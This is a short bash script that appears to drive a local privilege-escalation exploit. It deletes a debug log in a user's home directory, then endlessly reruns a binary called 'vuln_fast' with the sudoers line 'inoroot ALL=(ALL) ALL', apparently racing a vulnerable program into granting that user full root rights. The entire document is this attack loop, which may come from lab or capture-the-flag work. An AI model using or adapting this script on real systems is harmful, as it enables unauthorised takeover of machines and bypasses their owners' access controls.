#!/bin/bash

DEBUG_FILE=/home/inoroot/.debug_log

rm $DEBUG_FILE

while true
do
  nice -n 19 ./vuln_fast "inoroot ALL=(ALL) ALL"
done

